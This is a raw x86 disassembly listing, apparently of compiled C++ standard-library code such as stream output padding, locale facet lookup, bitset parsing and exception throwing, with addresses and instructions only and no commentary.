  42c494:	mov    DWORD PTR [edi+0x4],eax
  42c497:	mov    DWORD PTR [edi+0x18],esi
  42c49a:	push   DWORD PTR [ebp+0xc]
  42c49d:	mov    ecx,edi
  42c49f:	call   0x42c231
  42c4a4:	mov    ecx,DWORD PTR [ebp-0xc]
  42c4a7:	mov    DWORD PTR fs:0x0,ecx
  42c4ae:	pop    edi
  42c4af:	pop    esi
  42c4b0:	pop    ebx
  42c4b1:	leave  
  42c4b2:	ret    0x8
  42c4b5:	xor    esi,esi
  42c4b7:	push   esi
  42c4b8:	push   0x1
  42c4ba:	mov    ecx,DWORD PTR [ebp-0x1c]
  42c4bd:	call   0x42bb7b
  42c4c2:	push   esi
  42c4c3:	push   esi
  42c4c4:	call   0x42f187
  42c4c9:	int3   
  42c4ca:	push   esi
  42c4cb:	mov    esi,DWORD PTR [ecx+0x18]
  42c4ce:	cmp    esi,0x10
  42c4d1:	lea    eax,[ecx+0x4]
  42c4d4:	jb     0x42c4da
  42c4d6:	mov    edx,DWORD PTR [eax]
  42c4d8:	jmp    0x42c4dc
  42c4da:	mov    edx,eax
  42c4dc:	cmp    DWORD PTR [esp+0x8],edx
  42c4e0:	jb     0x42c4f8
  42c4e2:	cmp    esi,0x10
  42c4e5:	jb     0x42c4e9
  42c4e7:	mov    eax,DWORD PTR [eax]
  42c4e9:	mov    ecx,DWORD PTR [ecx+0x14]
  42c4ec:	add    ecx,eax
  42c4ee:	cmp    ecx,DWORD PTR [esp+0x8]
  42c4f2:	jbe    0x42c4f8
  42c4f4:	mov    al,0x1
  42c4f6:	jmp    0x42c4fa
  42c4f8:	xor    al,al
  42c4fa:	pop    esi
  42c4fb:	ret    0x4
  42c4fe:	push   ebp
  42c4ff:	mov    ebp,esp
  42c501:	mov    eax,DWORD PTR [ebp+0x8]
  42c504:	mov    DWORD PTR [ecx+0x10],eax
  42c507:	mov    eax,DWORD PTR [ebp+0x14]
  42c50a:	mov    DWORD PTR [ecx+0x14],eax
  42c50d:	mov    eax,DWORD PTR [ebp+0xc]
  42c510:	mov    DWORD PTR [ecx+0x20],eax
  42c513:	mov    eax,DWORD PTR [ebp+0x18]
  42c516:	mov    DWORD PTR [ecx+0x24],eax
  42c519:	mov    eax,DWORD PTR [ebp+0x10]
  42c51c:	mov    DWORD PTR [ecx+0x30],eax
  42c51f:	mov    eax,DWORD PTR [ebp+0x1c]
  42c522:	mov    DWORD PTR [ecx+0x34],eax
  42c525:	pop    ebp
  42c526:	ret    0x18
  42c529:	push   ebp
  42c52a:	mov    ebp,esp
  42c52c:	sub    esp,0x14
  42c52f:	push   esi
  42c530:	push   edi
  42c531:	push   0x0
  42c533:	lea    ecx,[ebp-0x8]
  42c536:	call   0x42d311
  42c53b:	mov    esi,DWORD PTR ds:0x43fff0
  42c541:	mov    ecx,0x43f9c8
  42c546:	mov    DWORD PTR [ebp-0x4],esi
  42c549:	call   0x4010fb
  42c54e:	mov    ecx,DWORD PTR [ebp+0x8]
  42c551:	push   eax
  42c552:	call   0x42cf44
  42c557:	mov    edi,eax
  42c559:	test   edi,edi
  42c55b:	jne    0x42c5a6
  42c55d:	test   esi,esi
  42c55f:	je     0x42c565
  42c561:	mov    edi,esi
  42c563:	jmp    0x42c5a6
  42c565:	lea    eax,[ebp-0x4]
  42c568:	push   eax
  42c569:	call   0x40122c
  42c56e:	cmp    eax,0xffffffff
  42c571:	pop    ecx
  42c572:	jne    0x42c58f
  42c574:	push   0x43b50c
  42c579:	lea    ecx,[ebp-0x14]
  42c57c:	call   0x42e6dc
  42c581:	push   0x43bf1c
  42c586:	lea    eax,[ebp-0x14]
  42c589:	push   eax
  42c58a:	call   0x42f187
  42c58f:	mov    edi,DWORD PTR [ebp-0x4]
  42c592:	mov    ecx,edi
  42c594:	mov    DWORD PTR ds:0x43fff0,edi
  42c59a:	call   0x401130
  42c59f:	mov    ecx,edi
  42c5a1:	call   0x42cfbc
  42c5a6:	lea    ecx,[ebp-0x8]
  42c5a9:	call   0x42d334
  42c5ae:	mov    eax,edi
  42c5b0:	pop    edi
  42c5b1:	pop    esi
  42c5b2:	leave  
  42c5b3:	ret    
  42c5b4:	mov    eax,0x438068
  42c5b9:	call   0x42f168
  42c5be:	sub    esp,0x40
  42c5c1:	push   ebx
  42c5c2:	push   esi
  42c5c3:	push   edi
  42c5c4:	mov    DWORD PTR [ebp-0x10],esp
  42c5c7:	mov    edi,DWORD PTR [ebp+0x8]
  42c5ca:	and    DWORD PTR [ebp-0x18],0x0
  42c5ce:	push   DWORD PTR [ebp+0xc]
  42c5d1:	call   0x42e160
  42c5d6:	pop    ecx
  42c5d7:	mov    esi,eax
  42c5d9:	mov    eax,DWORD PTR [edi]
  42c5db:	mov    eax,DWORD PTR [eax+0x4]
  42c5de:	mov    eax,DWORD PTR [eax+edi*1+0x18]
  42c5e2:	test   eax,eax
  42c5e4:	jle    0x42c5f1
  42c5e6:	cmp    eax,esi
  42c5e8:	jle    0x42c5f1
  42c5ea:	sub    eax,esi
  42c5ec:	mov    DWORD PTR [ebp-0x1c],eax
  42c5ef:	jmp    0x42c5f5
  42c5f1:	and    DWORD PTR [ebp-0x1c],0x0
  42c5f5:	lea    ebx,[ebp-0x4c]
  42c5f8:	call   0x42c0dd
  42c5fd:	xor    ebx,ebx
  42c5ff:	cmp    BYTE PTR [ebp-0x48],bl
  42c602:	jne    0x42c610
  42c604:	mov    DWORD PTR [ebp-0x18],0x4
  42c60b:	jmp    0x42c6f0
  42c610:	mov    DWORD PTR [ebp-0x4],ebx
  42c613:	mov    eax,DWORD PTR [edi]
  42c615:	mov    eax,DWORD PTR [eax+0x4]
  42c618:	mov    eax,DWORD PTR [eax+edi*1+0x10]
  42c61c:	mov    DWORD PTR [ebp-0x20],eax
  42c61f:	and    eax,0x1c0
  42c624:	cmp    eax,0x40
  42c627:	je     0x42c65d
  42c629:	cmp    DWORD PTR [ebp-0x1c],ebx
  42c62c:	jle    0x42c658
  42c62e:	mov    eax,DWORD PTR [edi]
  42c630:	mov    eax,DWORD PTR [eax+0x4]
  42c633:	add    eax,edi
  42c635:	mov    dl,BYTE PTR [eax+0x30]
  42c638:	mov    BYTE PTR [ebp-0x11],dl
  42c63b:	mov    eax,DWORD PTR [eax+0x28]
  42c63e:	mov    DWORD PTR [ebp-0x24],eax
  42c641:	mov    ecx,eax
  42c643:	call   0x42bec5
  42c648:	mov    DWORD PTR [ebp-0x28],eax
  42c64b:	or     DWORD PTR [ebp-0x2c],0xffffffff
  42c64f:	cmp    eax,0xffffffff
  42c652:	jne    0x42c692
  42c654:	or     DWORD PTR [ebp-0x18],0x4
  42c658:	cmp    DWORD PTR [ebp-0x18],ebx
  42c65b:	jne    0x42c67d
  42c65d:	mov    eax,DWORD PTR [edi]
  42c65f:	mov    eax,DWORD PTR [eax+0x4]
  42c662:	mov    ecx,DWORD PTR [eax+edi*1+0x28]
  42c666:	mov    DWORD PTR [ebp-0x30],ecx
  42c669:	mov    eax,DWORD PTR [ecx]
  42c66b:	push   esi
  42c66c:	push   DWORD PTR [ebp+0xc]
  42c66f:	call   DWORD PTR [eax+0x1c]
  42c672:	cmp    eax,esi
  42c674:	je     0x42c697
  42c676:	mov    DWORD PTR [ebp-0x18],0x4
  42c67d:	mov    eax,DWORD PTR [edi]
  42c67f:	mov    eax,DWORD PTR [eax+0x4]
  42c682:	add    eax,edi
  42c684:	mov    DWORD PTR [ebp-0x40],eax
  42c687:	mov    ecx,DWORD PTR [eax+0x18]
  42c68a:	mov    DWORD PTR [ebp-0x44],ecx
  42c68d:	mov    DWORD PTR [eax+0x18],ebx
  42c690:	jmp    0x42c6f0
  42c692:	dec    DWORD PTR [ebp-0x1c]
  42c695:	jmp    0x42c629
  42c697:	cmp    DWORD PTR [ebp-0x1c],ebx
  42c69a:	jle    0x42c67d
  42c69c:	mov    eax,DWORD PTR [edi]
  42c69e:	mov    eax,DWORD PTR [eax+0x4]
  42c6a1:	add    eax,edi
  42c6a3:	mov    dl,BYTE PTR [eax+0x30]
  42c6a6:	mov    BYTE PTR [ebp-0x12],dl
  42c6a9:	mov    eax,DWORD PTR [eax+0x28]
  42c6ac:	mov    DWORD PTR [ebp-0x34],eax
  42c6af:	mov    ecx,eax
  42c6b1:	call   0x42bec5
  42c6b6:	mov    DWORD PTR [ebp-0x38],eax
  42c6b9:	or     DWORD PTR [ebp-0x3c],0xffffffff
  42c6bd:	cmp    eax,0xffffffff
  42c6c0:	jne    0x42c6c8
  42c6c2:	or     DWORD PTR [ebp-0x18],0x4
  42c6c6:	jmp    0x42c67d
  42c6c8:	dec    DWORD PTR [ebp-0x1c]
  42c6cb:	jmp    0x42c697
  42c6cd:	mov    eax,DWORD PTR [ebp+0x8]
  42c6d0:	mov    ecx,DWORD PTR [eax]
  42c6d2:	mov    ecx,DWORD PTR [ecx+0x4]
  42c6d5:	add    ecx,eax
  42c6d7:	mov    eax,DWORD PTR [ecx+0x8]
  42c6da:	push   0x1
  42c6dc:	or     eax,0x4
  42c6df:	push   eax
  42c6e0:	call   0x42bbc4
  42c6e5:	mov    eax,0x42c6eb
  42c6ea:	ret    
  42c6eb:	mov    edi,DWORD PTR [ebp+0x8]
  42c6ee:	xor    ebx,ebx
  42c6f0:	or     DWORD PTR [ebp-0x4],0xffffffff
  42c6f4:	push   ebx
  42c6f5:	push   DWORD PTR [ebp-0x18]
  42c6f8:	mov    eax,DWORD PTR [edi]
  42c6fa:	mov    ecx,DWORD PTR [eax+0x4]
  42c6fd:	add    ecx,edi
  42c6ff:	call   0x42af0b
  42c704:	lea    esi,[ebp-0x4c]
  42c707:	call   0x42c116
  42c70c:	mov    eax,edi
  42c70e:	mov    ecx,DWORD PTR [ebp-0xc]
  42c711:	mov    DWORD PTR fs:0x0,ecx
  42c718:	pop    edi
  42c719:	pop    esi
  42c71a:	pop    ebx
  42c71b:	leave  
  42c71c:	ret    
  42c71d:	mov    eax,0x43805e
  42c722:	call   0x42f168
  42c727:	sub    esp,0x40
  42c72a:	push   ebx
  42c72b:	push   esi
  42c72c:	push   edi
  42c72d:	mov    DWORD PTR [ebp-0x10],esp
  42c730:	mov    edi,DWORD PTR [ebp+0x8]
  42c733:	and    DWORD PTR [ebp-0x18],0x0
  42c737:	lea    ebx,[ebp-0x4c]
  42c73a:	call   0x42c0dd
  42c73f:	cmp    BYTE PTR [ebp-0x48],0x0
  42c743:	je     0x42c835
  42c749:	mov    eax,DWORD PTR [edi]
  42c74b:	mov    eax,DWORD PTR [eax+0x4]
  42c74e:	mov    eax,DWORD PTR [eax+edi*1+0x18]
  42c752:	cmp    eax,0x1
  42c755:	jg     0x42c75b
  42c757:	xor    esi,esi
  42c759:	jmp    0x42c75e
  42c75b:	lea    esi,[eax-0x1]
  42c75e:	and    DWORD PTR [ebp-0x4],0x0
  42c762:	mov    eax,DWORD PTR [edi]
  42c764:	mov    eax,DWORD PTR [eax+0x4]
  42c767:	mov    eax,DWORD PTR [eax+edi*1+0x10]
  42c76b:	mov    DWORD PTR [ebp-0x20],eax
  42c76e:	and    eax,0x1c0
  42c773:	push   0x4
  42c775:	pop    ebx
  42c776:	cmp    eax,0x40
  42c779:	je     0x42c7b8
  42c77b:	cmp    DWORD PTR [ebp-0x18],0x0
  42c77f:	jne    0x42c835
  42c785:	test   esi,esi
  42c787:	jle    0x42c7b8
  42c789:	mov    eax,DWORD PTR [edi]
  42c78b:	mov    eax,DWORD PTR [eax+0x4]
  42c78e:	add    eax,edi
  42c790:	mov    dl,BYTE PTR [eax+0x30]
  42c793:	mov    BYTE PTR [ebp-0x11],dl
  42c796:	mov    eax,DWORD PTR [eax+0x28]
  42c799:	mov    DWORD PTR [ebp-0x24],eax
  42c79c:	mov    ecx,eax
  42c79e:	call   0x42bec5
  42c7a3:	mov    DWORD PTR [ebp-0x28],eax
  42c7a6:	or     DWORD PTR [ebp-0x2c],0xffffffff
  42c7aa:	cmp    eax,0xffffffff
  42c7ad:	jne    0x42c7b2
  42c7af:	mov    DWORD PTR [ebp-0x18],ebx
  42c7b2:	dec    esi
  42c7b3:	mov    DWORD PTR [ebp-0x1c],esi
  42c7b6:	jmp    0x42c77b
  42c7b8:	mov    eax,DWORD PTR [edi]
  42c7ba:	mov    eax,DWORD PTR [eax+0x4]
  42c7bd:	mov    ecx,DWORD PTR [eax+edi*1+0x28]
  42c7c1:	mov    DWORD PTR [ebp-0x30],ecx
  42c7c4:	mov    dl,BYTE PTR [ebp+0xc]
  42c7c7:	call   0x42bec5
  42c7cc:	mov    DWORD PTR [ebp-0x34],eax
  42c7cf:	or     DWORD PTR [ebp-0x38],0xffffffff
  42c7d3:	cmp    eax,0xffffffff
  42c7d6:	jne    0x42c7db
  42c7d8:	mov    DWORD PTR [ebp-0x18],ebx
  42c7db:	cmp    DWORD PTR [ebp-0x18],0x0
  42c7df:	jne    0x42c835
  42c7e1:	test   esi,esi
  42c7e3:	jle    0x42c835
  42c7e5:	mov    eax,DWORD PTR [edi]
  42c7e7:	mov    eax,DWORD PTR [eax+0x4]
  42c7ea:	add    eax,edi
  42c7ec:	mov    dl,BYTE PTR [eax+0x30]
  42c7ef:	mov    BYTE PTR [ebp-0x12],dl
  42c7f2:	mov    eax,DWORD PTR [eax+0x28]
  42c7f5:	mov    DWORD PTR [ebp-0x3c],eax
  42c7f8:	mov    ecx,eax
  42c7fa:	call   0x42bec5
  42c7ff:	mov    DWORD PTR [ebp-0x40],eax
  42c802:	or     DWORD PTR [ebp-0x44],0xffffffff
  42c806:	cmp    eax,0xffffffff
  42c809:	jne    0x42c80e
  42c80b:	mov    DWORD PTR [ebp-0x18],ebx
  42c80e:	dec    esi
  42c80f:	mov    DWORD PTR [ebp-0x1c],esi
  42c812:	jmp    0x42c7db
  42c814:	mov    eax,DWORD PTR [ebp+0x8]
  42c817:	mov    ecx,DWORD PTR [eax]
  42c819:	mov    ecx,DWORD PTR [ecx+0x4]
  42c81c:	add    ecx,eax
  42c81e:	mov    eax,DWORD PTR [ecx+0x8]
  42c821:	push   0x1
  42c823:	or     eax,0x4
  42c826:	push   eax
  42c827:	call   0x42bbc4
  42c82c:	mov    eax,0x42c832
  42c831:	ret    
  42c832:	mov    edi,DWORD PTR [ebp+0x8]
  42c835:	or     DWORD PTR [ebp-0x4],0xffffffff
  42c839:	mov    eax,DWORD PTR [edi]
  42c83b:	mov    eax,DWORD PTR [eax+0x4]
  42c83e:	and    DWORD PTR [eax+edi*1+0x18],0x0
  42c843:	push   0x0
  42c845:	push   DWORD PTR [ebp-0x18]
  42c848:	mov    eax,DWORD PTR [edi]
  42c84a:	mov    ecx,DWORD PTR [eax+0x4]
  42c84d:	add    ecx,edi
  42c84f:	call   0x42af0b
  42c854:	lea    esi,[ebp-0x4c]
  42c857:	call   0x42c116
  42c85c:	mov    eax,edi
  42c85e:	mov    ecx,DWORD PTR [ebp-0xc]
  42c861:	mov    DWORD PTR fs:0x0,ecx
  42c868:	pop    edi
  42c869:	pop    esi
  42c86a:	pop    ebx
  42c86b:	leave  
  42c86c:	ret    
  42c86d:	push   ebp
  42c86e:	mov    ebp,esp
  42c870:	sub    esp,0x14
  42c873:	push   esi
  42c874:	push   edi
  42c875:	push   0x0
  42c877:	lea    ecx,[ebp-0x8]
  42c87a:	call   0x42d311
  42c87f:	mov    esi,DWORD PTR ds:0x43ffec
  42c885:	mov    ecx,0x464eac
  42c88a:	mov    DWORD PTR [ebp-0x4],esi
  42c88d:	call   0x4010fb
  42c892:	mov    ecx,DWORD PTR [ebp+0x8]
  42c895:	push   eax
  42c896:	call   0x42cf44
  42c89b:	mov    edi,eax
  42c89d:	test   edi,edi
  42c89f:	jne    0x42c8ea
  42c8a1:	test   esi,esi
  42c8a3:	je     0x42c8a9
  42c8a5:	mov    edi,esi
  42c8a7:	jmp    0x42c8ea
  42c8a9:	lea    eax,[ebp-0x4]
  42c8ac:	push   eax
  42c8ad:	call   0x42c8f8
  42c8b2:	cmp    eax,0xffffffff
  42c8b5:	pop    ecx
  42c8b6:	jne    0x42c8d3
  42c8b8:	push   0x43b50c
  42c8bd:	lea    ecx,[ebp-0x14]
  42c8c0:	call   0x42e6dc
  42c8c5:	push   0x43bf1c
  42c8ca:	lea    eax,[ebp-0x14]
  42c8cd:	push   eax
  42c8ce:	call   0x42f187
  42c8d3:	mov    edi,DWORD PTR [ebp-0x4]
  42c8d6:	mov    ecx,edi
  42c8d8:	mov    DWORD PTR ds:0x43ffec,edi
  42c8de:	call   0x401130
  42c8e3:	mov    ecx,edi
  42c8e5:	call   0x42cfbc
  42c8ea:	lea    ecx,[ebp-0x8]
  42c8ed:	call   0x42d334
  42c8f2:	mov    eax,edi
  42c8f4:	pop    edi
  42c8f5:	pop    esi
  42c8f6:	leave  
  42c8f7:	ret    
  42c8f8:	push   edi
  42c8f9:	mov    edi,DWORD PTR [esp+0x8]
  42c8fd:	test   edi,edi
  42c8ff:	je     0x42c91f
  42c901:	cmp    DWORD PTR [edi],0x0
  42c904:	jne    0x42c91f
  42c906:	push   esi
  42c907:	push   0x8
  42c909:	call   0x42d8d9
  42c90e:	mov    esi,eax
  42c910:	xor    eax,eax
  42c912:	test   esi,esi
  42c914:	pop    ecx
  42c915:	je     0x42c91c
  42c917:	call   0x42c924
  42c91c:	mov    DWORD PTR [edi],eax
  42c91e:	pop    esi
  42c91f:	push   0x2
  42c921:	pop    eax
  42c922:	pop    edi
  42c923:	ret    
  42c924:	push   ebp
  42c925:	mov    ebp,esp
  42c927:	sub    esp,0x74
  42c92a:	push   0x43b560
  42c92f:	lea    ecx,[ebp-0x74]
  42c932:	mov    DWORD PTR [esi+0x4],eax
  42c935:	mov    DWORD PTR [esi],0x4392a0
  42c93b:	call   0x42d140
  42c940:	lea    ecx,[ebp-0x74]
  42c943:	call   0x42d07d
  42c948:	mov    eax,esi
  42c94a:	leave  
  42c94b:	ret    
  42c94c:	push   ebp
  42c94d:	mov    ebp,esp
  42c94f:	push   ecx
  42c950:	push   ebx
  42c951:	push   edi
  42c952:	mov    ebx,eax
  42c954:	mov    eax,DWORD PTR [esi+0x14]
  42c957:	mov    edi,ecx
  42c959:	cmp    eax,edi
  42c95b:	jae    0x42c962
  42c95d:	call   0x42ca2d
  42c962:	sub    eax,edi
  42c964:	cmp    eax,ebx
  42c966:	jae    0x42c96a
  42c968:	mov    ebx,eax
  42c96a:	cmp    ebx,0x5
  42c96d:	jbe    0x42c972
  42c96f:	push   0x5
  42c971:	pop    ebx
  42c972:	mov    eax,DWORD PTR [ebp+0x8]
  42c975:	and    DWORD PTR [eax],0x0
  42c978:	and    DWORD PTR [ebp-0x4],0x0
  42c97c:	add    edi,ebx
  42c97e:	test   ebx,ebx
  42c980:	jbe    0x42c9be
  42c982:	mov    edx,DWORD PTR [esi+0x18]
  42c985:	dec    edi
  42c986:	cmp    edx,0x10
  42c989:	lea    eax,[esi+0x4]
  42c98c:	jb     0x42c992
  42c98e:	mov    ecx,DWORD PTR [eax]
  42c990:	jmp    0x42c994
  42c992:	mov    ecx,eax
  42c994:	cmp    BYTE PTR [ecx+edi*1],0x31
  42c998:	jne    0x42c9a9
  42c99a:	mov    ecx,DWORD PTR [ebp-0x4]
  42c99d:	mov    eax,DWORD PTR [ebp+0x8]
  42c9a0:	push   0x1
  42c9a2:	call   0x42c9ca
  42c9a7:	jmp    0x42c9b6
  42c9a9:	cmp    edx,0x10
  42c9ac:	jb     0x42c9b0
  42c9ae:	mov    eax,DWORD PTR [eax]
  42c9b0:	cmp    BYTE PTR [eax+edi*1],0x30
  42c9b4:	jne    0x42c9c4
  42c9b6:	inc    DWORD PTR [ebp-0x4]
  42c9b9:	cmp    DWORD PTR [ebp-0x4],ebx
  42c9bc:	jb     0x42c982
  42c9be:	pop    edi
  42c9bf:	pop    ebx
  42c9c0:	leave  
  42c9c1:	ret    0x4
  42c9c4:	call   0x42c9f8
  42c9c9:	int3   
  42c9ca:	cmp    ecx,0x5
  42c9cd:	jb     0x42c9d4
  42c9cf:	call   0x42ca2d
  42c9d4:	push   esi
  42c9d5:	xor    esi,esi
  42c9d7:	mov    edx,ecx
  42c9d9:	inc    esi
  42c9da:	and    ecx,0x1f
  42c9dd:	shr    edx,0x5
  42c9e0:	shl    esi,cl
  42c9e2:	cmp    BYTE PTR [esp+0x8],0x0
  42c9e7:	lea    edx,[eax+edx*4]
  42c9ea:	je     0x42c9f0
  42c9ec:	or     DWORD PTR [edx],esi
  42c9ee:	jmp    0x42c9f4
  42c9f0:	not    esi
  42c9f2:	and    DWORD PTR [edx],esi
  42c9f4:	pop    esi
  42c9f5:	ret    0x4
  42c9f8:	push   ebp
  42c9f9:	mov    ebp,esp
  42c9fb:	sub    esp,0x44
  42c9fe:	push   0x43b4f4
  42ca03:	lea    ecx,[ebp-0x1c]
  42ca06:	call   0x42ae9f
  42ca0b:	lea    eax,[ebp-0x1c]
  42ca0e:	push   eax
  42ca0f:	lea    ecx,[ebp-0x44]
  42ca12:	call   0x401017
  42ca17:	push   0x43bec4
  42ca1c:	lea    eax,[ebp-0x44]
  42ca1f:	push   eax
  42ca20:	mov    DWORD PTR [ebp-0x44],0x43b4d0
  42ca27:	call   0x42f187
  42ca2c:	int3   
  42ca2d:	push   ebp
  42ca2e:	mov    ebp,esp
  42ca30:	sub    esp,0x44
  42ca33:	push   0x43b4d8
  42ca38:	lea    ecx,[ebp-0x1c]
  42ca3b:	call   0x42ae9f
  42ca40:	lea    eax,[ebp-0x1c]
  42ca43:	push   eax
  42ca44:	lea    ecx,[ebp-0x44]
  42ca47:	call   0x401017
  42ca4c:	push   0x43be88
  42ca51:	lea    eax,[ebp-0x44]
  42ca54:	push   eax
  42ca55:	mov    DWORD PTR [ebp-0x44],0x4392f4
  42ca5c:	call   0x42f187
  42ca61:	int3   
  42ca62:	push   esi
  42ca63:	push   DWORD PTR [esp+0x8]
  42ca67:	mov    esi,ecx
  42ca69:	call   0x42ca7a
  42ca6e:	mov    DWORD PTR [esi],0x43b4d0
  42ca74:	mov    eax,esi
  42ca76:	pop    esi
  42ca77:	ret    0x4
  42ca7a:	push   esi
  42ca7b:	push   edi
  42ca7c:	mov    edi,DWORD PTR [esp+0xc]
  42ca80:	push   edi
  42ca81:	mov    esi,ecx
  42ca83:	call   0x42e66f
  42ca88:	add    edi,0xc
  42ca8b:	push   edi
  42ca8c:	lea    ecx,[esi+0xc]
  42ca8f:	mov    DWORD PTR [esi],0x4392dc
  42ca95:	call   0x42ae79
  42ca9a:	pop    edi
  42ca9b:	mov    eax,esi
  42ca9d:	pop    esi
  42ca9e:	ret    0x4
  42caa1:	push   esi
  42caa2:	push   DWORD PTR [esp+0x8]
  42caa6:	mov    esi,ecx
  42caa8:	call   0x42ca7a
  42caad:	mov    DWORD PTR [esi],0x4392f4
  42cab3:	mov    eax,esi
  42cab5:	pop    esi
  42cab6:	ret    0x4
  42cab9:	int3   
  42caba:	jmp    DWORD PTR ds:0x43916c
  42cac0:	jmp    DWORD PTR ds:0x439168
  42cac6:	push   esi
  42cac7:	push   edi
  42cac8:	mov    edi,ecx
  42caca:	mov    esi,DWORD PTR [edi+0x20]
  42cacd:	jmp    0x42cadf
  42cacf:	push   DWORD PTR [esi+0x4]
  42cad2:	push   edi
  42cad3:	push   DWORD PTR [esp+0x14]
  42cad7:	call   DWORD PTR [esi+0x8]
  42cada:	mov    esi,DWORD PTR [esi]
  42cadc:	add    esp,0xc
  42cadf:	test   esi,esi
  42cae1:	jne    0x42cacf
  42cae3:	pop    edi
  42cae4:	pop    esi
  42cae5:	ret    0x4
  42cae8:	push   ebp
  42cae9:	mov    ebp,esp
  42caeb:	push   ecx
  42caec:	push   esi
  42caed:	mov    esi,ecx
  42caef:	push   0x2
  42caf1:	lea    ecx,[ebp-0x4]
  42caf4:	call   0x42d311
  42caf9:	mov    DWORD PTR [esi+0x4],0x1
  42cb00:	mov    eax,DWORD PTR [esi+0x4]
  42cb03:	mov    eax,DWORD PTR [eax*4+0x43f84c]
  42cb0a:	test   eax,eax
  42cb0c:	je     0x42cb1b
  42cb0e:	cmp    eax,esi
  42cb10:	je     0x42cb1b
  42cb12:	inc    DWORD PTR [esi+0x4]
  42cb15:	cmp    DWORD PTR [esi+0x4],0x8
  42cb19:	jb     0x42cb00
  42cb1b:	mov    eax,DWORD PTR [esi+0x4]
  42cb1e:	mov    DWORD PTR [eax*4+0x43f84c],esi
  42cb25:	mov    esi,DWORD PTR [esi+0x4]
  42cb28:	inc    BYTE PTR [esi+0x43f874]
  42cb2e:	lea    ecx,[ebp-0x4]
  42cb31:	call   0x42d334
  42cb36:	pop    esi
  42cb37:	leave  
  42cb38:	ret    
  42cb39:	push   esi
  42cb3a:	push   edi
  42cb3b:	push   0x0
  42cb3d:	mov    esi,ecx
  42cb3f:	call   0x42cac6
  42cb44:	mov    eax,DWORD PTR [esi+0x1c]
  42cb47:	test   eax,eax
  42cb49:	je     0x42cb5a
  42cb4b:	mov    edi,DWORD PTR [eax]
  42cb4d:	push   eax
  42cb4e:	call   0x42e750
  42cb53:	test   edi,edi
  42cb55:	pop    ecx
  42cb56:	mov    eax,edi
  42cb58:	jne    0x42cb4b
  42cb5a:	mov    eax,DWORD PTR [esi+0x20]
  42cb5d:	and    DWORD PTR [esi+0x1c],0x0
  42cb61:	test   eax,eax
  42cb63:	je     0x42cb74
  42cb65:	mov    edi,DWORD PTR [eax]
  42cb67:	push   eax
  42cb68:	call   0x42e750
  42cb6d:	test   edi,edi
  42cb6f:	pop    ecx
  42cb70:	mov    eax,edi
  42cb72:	jne    0x42cb65
  42cb74:	and    DWORD PTR [esi+0x20],0x0
  42cb78:	pop    edi
  42cb79:	pop    esi
  42cb7a:	ret    
  42cb7b:	push   esi
  42cb7c:	mov    esi,ecx
  42cb7e:	mov    eax,DWORD PTR [esi+0x4]
  42cb81:	test   eax,eax
  42cb83:	mov    DWORD PTR [esi],0x439180
  42cb89:	jbe    0x42cb9d
  42cb8b:	dec    BYTE PTR [eax+0x43f874]
  42cb91:	mov    eax,DWORD PTR [esi+0x4]
  42cb94:	cmp    BYTE PTR [eax+0x43f874],0x0
  42cb9b:	jg     0x42cbb9
  42cb9d:	mov    ecx,esi
  42cb9f:	call   0x42cb39
  42cba4:	mov    esi,DWORD PTR [esi+0x24]
  42cba7:	test   esi,esi
  42cba9:	je     0x42cbb9
  42cbab:	mov    ecx,esi
  42cbad:	call   0x40119a
  42cbb2:	push   esi
  42cbb3:	call   0x42e750
  42cbb8:	pop    ecx
  42cbb9:	pop    esi
  42cbba:	ret    
  42cbbb:	push   esi
  42cbbc:	mov    esi,ecx
  42cbbe:	push   0x0
  42cbc0:	push   0x1
  42cbc2:	lea    ecx,[esi+0xc]
  42cbc5:	mov    DWORD PTR [esi],0x439188
  42cbcb:	call   0x42bb7b
  42cbd0:	mov    ecx,esi
  42cbd2:	pop    esi
  42cbd3:	jmp    0x42e6b9
  42cbd8:	push   esi
  42cbd9:	mov    esi,ecx
  42cbdb:	call   0x42cbbb
  42cbe0:	test   BYTE PTR [esp+0x8],0x1
  42cbe5:	je     0x42cbee
  42cbe7:	push   esi
  42cbe8:	call   0x42e750
  42cbed:	pop    ecx
  42cbee:	mov    eax,esi
  42cbf0:	pop    esi
  42cbf1:	ret    0x4
  42cbf4:	mov    eax,0x437f81
  42cbf9:	call   0x42f168
  42cbfe:	push   ecx
  42cbff:	push   esi
  42cc00:	mov    esi,ecx
  42cc02:	mov    DWORD PTR [ebp-0x10],esi
  42cc05:	call   0x42e621
  42cc0a:	push   DWORD PTR [ebp+0x8]
  42cc0d:	and    DWORD PTR [ebp-0x4],0x0
  42cc11:	lea    ecx,[esi+0xc]
  42cc14:	mov    DWORD PTR [esi],0x439188
  42cc1a:	call   0x42ae79
  42cc1f:	mov    ecx,DWORD PTR [ebp-0xc]
  42cc22:	mov    eax,esi
  42cc24:	pop    esi
  42cc25:	mov    DWORD PTR fs:0x0,ecx
  42cc2c:	leave  
  42cc2d:	ret    0x4
  42cc30:	push   esi
  42cc31:	mov    esi,ecx
  42cc33:	call   0x42cc4c
  42cc38:	test   BYTE PTR [esp+0x8],0x1
  42cc3d:	je     0x42cc46
  42cc3f:	push   esi
  42cc40:	call   0x42e750
  42cc45:	pop    ecx
  42cc46:	mov    eax,esi
  42cc48:	pop    esi
  42cc49:	ret    0x4
  42cc4c:	mov    DWORD PTR [ecx],0x439194
  42cc52:	jmp    0x42cbbb
  42cc57:	mov    eax,0x437f6f
  42cc5c:	call   0x42f168
  42cc61:	sub    esp,0x88
  42cc67:	mov    eax,DWORD PTR [ebp+0x8]
  42cc6a:	and    eax,0x17
  42cc6d:	mov    DWORD PTR [ecx+0x8],eax
  42cc70:	mov    ecx,DWORD PTR [ecx+0xc]
  42cc73:	and    ecx,eax
  42cc75:	je     0x42cd0f
  42cc7b:	xor    ebx,ebx
  42cc7d:	cmp    BYTE PTR [ebp+0xc],bl
  42cc80:	je     0x42cc89
  42cc82:	push   ebx
  42cc83:	push   ebx
  42cc84:	jmp    0x42cd0a
  42cc89:	test   cl,0x4
  42cc8c:	je     0x42ccbb
  42cc8e:	push   0x4391cc
  42cc93:	lea    ecx,[ebp-0x50]
  42cc96:	call   0x42ae9f
  42cc9b:	mov    DWORD PTR [ebp-0x4],ebx
  42cc9e:	lea    eax,[ebp-0x50]
  42cca1:	push   eax
  42cca2:	lea    ecx,[ebp-0x34]
  42cca5:	call   0x42cbf4
  42ccaa:	mov    DWORD PTR [ebp-0x34],0x439194
  42ccb1:	push   0x43bc78
  42ccb6:	lea    eax,[ebp-0x34]
  42ccb9:	jmp    0x42cd09
  42ccbb:	push   0x2
  42ccbd:	pop    ebx
  42ccbe:	test   bl,cl
  42ccc0:	je     0x42ccd8
  42ccc2:	push   0x4391b4
